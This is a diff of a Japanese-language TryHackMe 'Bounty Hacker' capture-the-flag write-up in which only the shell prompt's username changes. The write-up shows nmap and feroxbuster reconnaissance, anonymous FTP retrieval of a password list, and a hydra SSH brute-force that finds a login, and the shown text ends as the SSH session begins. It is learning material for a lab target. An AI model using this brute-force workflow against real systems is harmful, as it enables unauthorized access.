@@ -28,7 +28,7 @@
     
     <article class="writeup-body">
       <p><code>nmap --script=vuln</code>を実施</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ nmap 10.49.154.8 --script=vuln           
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 10:22 +0900
 Nmap scan report for 10.49.154.8
@@ -50,7 +50,7 @@ Nmap done: 1 IP address (1 host up) scanned in 44.54 seconds
 <p><code>ftp</code>,<code>ssh</code>,<code>http</code>がopenになっていた<br>
 わっかりやすい脆弱性はヒットしなかったが<code>http-enum</code>にていくつかのディレクトリはヒットした</p>
 <p>つづいてバージョン情報なども探ってみる</p>
-<pre><code class="language-bash">──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ nmap -sV -sC -oX scan.xml -T4 -p- 10.49.154.8
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 10:18 +0900
 Nmap scan report for 10.49.154.8
@@ -87,7 +87,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 358.75 seconds
 </code></pre>
 <p><code>scan.xml</code>を用いてsearchsploitにないか探す</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ searchsploit --nmap scan.xml    
 [i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
 [i] Reading: 'scan.xml'
@@ -169,12 +169,12 @@ Shellcodes: No Results
 </code></pre>
 <p>バージョンまで一致したものはヒットしなかった<br>
 whatwebをやっておく</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ whatweb http://10.49.154.8            
 http://10.49.154.8 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.49.154.8]
 </code></pre>
 <p>feroxbusterでもやってみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ feroxbuster -u http://10.49.154.8  
 
  ___  ___  __   __     __      __         __   ___
@@ -209,7 +209,7 @@ by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
 [####################] - 1s     30000/30000   21994/s http://10.49.154.8/images/ =&gt; Directory listing (add --scan-dir-listings to scan)
 [####################] - 80s    30000/30000   374/s   http://10.49.154.8/javascript/ 
 [####################] - 80s    30000/30000   374/s   http://10.49.154.8/javascript/jquery/                                                                                                                                            
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ curl http://10.49.154.8            
 &lt;html&gt;
 
@@ -242,14 +242,14 @@ p {text-align: center;}
 &lt;/html&gt;
 
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ 
 </code></pre>
 <p>手がかりがつかめず迷子になった！</p>
 <hr>
 <p>ftpの項目を見ると<code>Anonymous FTP login allowed</code>とあるので<br>
 <code>ftp anounymous@10.59.154.8</code>してみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ ftp anonymous@10.49.154.8 
 Connected to 10.49.154.8.
 220 (vsFTPd 3.0.5)
@@ -284,7 +284,7 @@ ftp&gt; exit
 </code></pre>
 <p><code>get</code>コマンドを使って見つかったテキストファイルをダウンロードした<br>
 ftpサーバへのログインは共有フォルダへのログインのようなものらしい</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ cat locks.txt              
 rEddrAGON
 ReDdr4g0nSynd!cat3
@@ -313,21 +313,21 @@ rEDdrAGOnSyNDiCat3
 r3ddr@g0N
 ReDSynd1ca7e
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ cat task.txt 
 1.) Protect Vicious.
 2.) Plan for Red Eye pickup on the moon.
 
 -lin
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ 
 </code></pre>
 <p>レッドドラゴンがどうとか言っている</p>
 <p>linをユーザー名として、sshにブルートフォースを仕掛ける<br>
 パスワードはレッドドラゴンのどれかじゃないかな<br>
 <code>hydra -l lin -P locks.txt ssh://10.49.154.8</code>を実施する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ hydra -l lin -P locks.txt ssh://10.49.154.8
 Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -342,12 +342,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 10:53:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 10:54:05
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ 
 </code></pre>
 <p>なんか見つかったっぽい</p>
 <p>ログインしていく</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bountyHacker]
 └─$ ssh lin@10.49.154.8      
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
